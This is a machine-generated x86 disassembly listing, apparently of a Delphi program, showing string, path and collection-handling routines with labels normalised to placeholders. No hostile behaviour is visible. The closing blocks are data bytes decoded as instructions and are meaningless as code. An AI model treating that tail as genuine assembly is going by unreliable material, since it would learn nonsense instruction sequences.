call sub_465754
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_464b58
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_463414
sub_465294
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_46531d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465324
mov eax [ ebp - 0x4 ]
call sub_465704
retn
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov ecx edi
mov edx esi
call sub_464b88
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
sub_465330
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_465397
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46539e
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov edx esi
call sub_464ba8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4653a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_465410
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465417
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov ecx edi
mov edx esi
call sub_464c20
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_465420
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_46548c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465493
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov ecx edi
mov edx esi
call sub_464c34
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_46549c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_465503
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46550a
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov edx esi
call sub_464c48
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_465510
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_465577
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46557e
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov edx esi
call sub_464c5c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_465584
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_4655f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4655f7
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov ecx edi
mov edx esi
call sub_464c78
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_465600
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_465670
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465677
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov ecx edi
mov edx esi
call sub_464c94
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_465680
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_4656f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4656fb
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov ecx edi
mov edx esi
call sub_464cbc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_465704
push ebx
mov ebx eax
cmp [ ebx + 0x3c ] 0x0
jle r-xdata
pop ebx
retn
dec [ ebx + 0x3c ]
mov [ ebx + 0x38 ] 0x0
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_424d1c
mov edx [ ebx + 0x30 ]
mov edx [ edx + 0x8 ]
dec edx
cmp eax edx
jge r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_424d8c
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_424cb4
xor eax eax
mov [ ebx + 0x34 ] eax
sub_465770
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_4657d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4657de
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov edx esi
call sub_464ce8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4657e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464d40
xor eax eax
push ebp
push sub_46584b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_465768
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465852
mov eax [ ebp - 0x4 ]
call sub_465704
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465754
mov edx esi
call sub_464d04
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_465858
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46587d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465884
retn
sub_4658e0
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x0
mov eax esi
call sub_404354
cmp edi eax
jg r-xdata
mov eax esi
call sub_404354
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
mov [ esp ] al
mov edx edi
mov eax esi
call sub_40c670
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esi + edi - 0x2 ] 0x5c
jne r-xdata
mov eax esi
call sub_404354
cmp eax 0x4
jl r-xdata
mov eax esi
call sub_404354
cmp eax 0x4
jl r-xdata
mov edx edi
dec edx
mov eax esi
call sub_40c670
test al al
jne r-xdata
mov al [ esp ]
sub al 0x2f
je r-xdata
mov eax esi
call sub_404354
sub eax 0x4
cmp edi eax
jle r-xdata
mov eax esi
call sub_404354
sub eax 0x4
cmp edi eax
jle r-xdata
cmp edi 0x2
jle r-xdata
mov bl 0x2
jmp r-xdata
sub al 0xb
jne r-xdata
mov al [ esi + edi - 0x2 ]
cmp al [ rw-data ]
jne r-xdata
mov bl 0x6
jmp r-xdata
mov bl 0x1
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
mov al [ esp ]
sub al 0x21
je r-xdata
cmp edi 0x2
jle r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c670
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
sub al 0x1b
je r-xdata
mov bl 0x7
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
sub al 0x2
je r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c670
cmp al 0x2
jne r-xdata
sub al 0x1e
jne r-xdata
mov al [ esp ]
sub al 0x23
je r-xdata
mov bl 0x5
jmp r-xdata
sub al 0x16
je r-xdata
sub al 0x28
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
mov al [ esp ]
sub al 0x30
je r-xdata
mov bl 0x4
sub al 0x11
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
sub_465a34
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov bl [ r-xdata ]
mov eax edi
call sub_404354
mov esi eax
test esi esi
jle r-xdata
mov edx [ esp ]
mov eax edi
call sub_4658e0
cmp al 0x1
jne r-xdata
mov ebp 0x1
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or bl 0x8
cmp al 0x3e
jne r-xdata
or bl 0x1
jmp r-xdata
cmp al 0x3c
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
inc ebp
dec esi
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
and bl 0xfb
cmp ebp 0x1
jle r-xdata
mov al [ edi + ebp - 0x1 ]
cmp al 0x21
jne r-xdata
and bl 0xfd
or bl 0x4
or bl 0x2
jmp r-xdata
cmp [ edi + ebp - 0x2 ] 0x3c
je r-xdata
sub_465ab0
mov edx eax
sub al 0x2f
je r-xdata
mov edx [ rw-data ]
mov dl [ edx ]
sub al 0xb
jne r-xdata
mov eax edx
retn
mov edx [ rw-data ]
mov dl [ edx ]
mov eax edx
retn
sub_465ad0
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_465cda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_4040e8
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_465a34
mov [ ebp - 0x11 ] al
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebx ]
call sub_404354
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_404354
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_404354
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ce1
lea eax [ ebp - 0x38 ]
mov edx 0x8
call sub_4040b8
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] eax
mov esi 0x1
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_4045b4
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_465ab0
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_40427c
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx ]
call sub_404354
mov ecx eax
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
inc edx
mov eax [ ebx ]
call sub_4045b4
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_404414
jmp r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4045b4
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_465ab0
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_40427c
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_404354
mov ecx eax
sub ecx [ ebp - 0x10 ]
inc ecx
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
call sub_4045b4
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_404414
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx ]
call sub_404354
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404354
mov esi eax
sub esi [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4658e0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x5 ]
call sub_40427c
mov edx [ ebp - 0x38 ]
mov ecx [ ebx ]
mov eax ebx
call sub_4043a0
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4658e0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
mov dl [ ebp - 0x5 ]
call sub_40427c
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_40435c
sub_465cec
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov [ esp ] 0x1
mov eax esi
call sub_404354
cmp eax 0x4
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or ebp 0xffffffff
or edi 0xffffffff
mov eax esi
call sub_404354
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
test ebp ebp
jge r-xdata
test edi edi
jge r-xdata
mov eax esi
call sub_404354
sub eax 0x4
cmp ebx eax
jl r-xdata
mov edi ebx
mov ebp ebx
jmp r-xdata
test edi edi
jle r-xdata
mov edi ebp
test edi edi
jl r-xdata
mov eax esi
call sub_404354
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_4658e0
cmp al 0x6
jne r-xdata
mov al [ esi + edi ]
cmp al [ rw-data ]
sete al
xor al 0x1
mov [ esp ] al
sub_465d70
push ebx
push esi
mov esi eax
mov bl [ rw-data ]
mov eax esi
call sub_404354
cmp eax 0x4
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_404354
mov edx eax
dec edx
mov eax esi
call sub_4658e0
cmp al 0x6
jne r-xdata
mov eax esi
call sub_404354
mov edx eax
sub edx 0x2
mov eax esi
call sub_4658e0
cmp al 0x6
je r-xdata
mov eax esi
call sub_404354
mov bl [ esi + eax - 0x1 ]
mov eax esi
call sub_404354
mov edx eax
sub edx 0x3
mov eax esi
call sub_4658e0
cmp al 0x6
jne r-xdata
sub_465ddc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_465e59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404094
mov esi ebx
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465e60
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
add al 0xfd
sub al 0x2
jb r-xdata
mov edx ebx
mov eax edi
call sub_4658e0
sub al 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
mov dl [ edi + ebx - 0x1 ]
call sub_40427c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40435c
mov eax [ ebp - 0x4 ]
sub_465e68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465ead
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_465ddc
mov eax [ ebp - 0x4 ]
call sub_404354
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465eb4
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_465ebc
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_404354
mov edx eax
mov eax edi
call sub_465e68
cmp eax ebx
jge r-xdata
xor ebp ebp
mov [ esp ] ebx
mov eax edi
call sub_404354
mov ebx eax
test ebx ebx
jle r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
dec [ esp ]
cmp [ esp ] 0x0
jl r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_4658e0
cmp al 0x3
je r-xdata
sub_465f18
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_465ebc
test eax eax
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4658e0
dec eax
sub al 0x2
setb bl
sub_465f40
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
xor eax eax
push ebp
push sub_4660c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_465a34
mov [ ebp - 0x9 ] al
mov eax esi
dec eax
mov [ ebp - 0x10 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax ebx
mov edx edi
call sub_4040e8
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_465a34
mov [ ebp - 0x9 ] al
test [ ebp - 0x9 ] 0x1
je r-xdata
push ebx
mov ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax edi
call sub_4045b4
sub esi [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax edi
call sub_404354
mov ecx eax
mov edx esi
mov eax edi
call sub_4045b4
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_4045b4
mov edx [ ebp - 0x28 ]
mov eax ebx
pop ecx
call sub_4043a0
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_404354
mov ecx eax
mov edx esi
sub edx [ ebp + 0x10 ]
mov eax edi
call sub_4045b4
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_4045b4
mov edx [ ebp - 0x20 ]
mov eax ebx
pop ecx
call sub_4043a0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_404354
mov ecx eax
mov edx [ ebp - 0x10 ]
inc edx
mov eax edi
call sub_4045b4
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_40435c
jmp r-xdata
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4660cc
lea eax [ ebp - 0x28 ]
mov edx 0x6
call sub_4040b8
retn
lea eax [ ebp - 0x14 ]
mov dl [ ebp + 0xc ]
call sub_40427c
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_40435c
dec esi
jne r-xdata
sub_4660d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46629e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx edi
call sub_4040e8
mov eax esi
call sub_404354
test eax eax
jle r-xdata
mov eax esi
call sub_404354
mov edx eax
mov eax esi
call sub_465e68
mov edi eax
mov eax [ ebx ]
call sub_404354
cmp edi eax
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov eax [ ebx ]
call sub_404354
test eax eax
jle r-xdata
mov eax [ ebx ]
call sub_404354
inc eax
push eax
sub edi [ ebp - 0x8 ]
push edi
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ ebx ]
mov eax esi
call sub_465f40
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_4040e8
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_465e68
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
call sub_404354
inc eax
mov [ ebp - 0xc ] eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebx ]
call sub_404354
sub eax edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4662a5
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_4040b8
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4658e0
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx ]
call sub_404354
cmp eax [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
dec edx
mov eax esi
call sub_465f18
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov edx [ ebx ]
mov eax esi
call sub_465f40
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_4040e8
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_465ab0
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_40427c
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_40435c
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
mov eax ebx
call j_sub_404560#2
mov edx [ ebp - 0x10 ]
mov cl [ ebp - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_465ab0
mov edx [ ebx ]
cmp al [ edx + edi - 0x1 ]
jne r-xdata
sub_4662b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4662d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4662dc
retn
sub_466b05
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
push 0x6948776f
outsb
je r-xdata
add [ esi ] cl
add al [ eax ]
dec [ eax ]
stosb [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
aad 0x43
add [ eax ] ah
pop [ eax + eax - 0x60 ]
pop [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cdq
add [ eax ] al
jmp [ eax + 0x68004426 ]
sub_466b46
mov eax 0x100448f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc ebx
add [ eax ] ah
pop [ eax + eax - 0x60 ]
pop [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
pop eax
inc esi
add [ eax ] dh
jno r-xdata
add [ eax ] eax
add [ eax ] al
add ah al
jno r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
dec edi
outsb
inc ebx
push 0x65676e61
sub al 0x1a
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9456c14
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
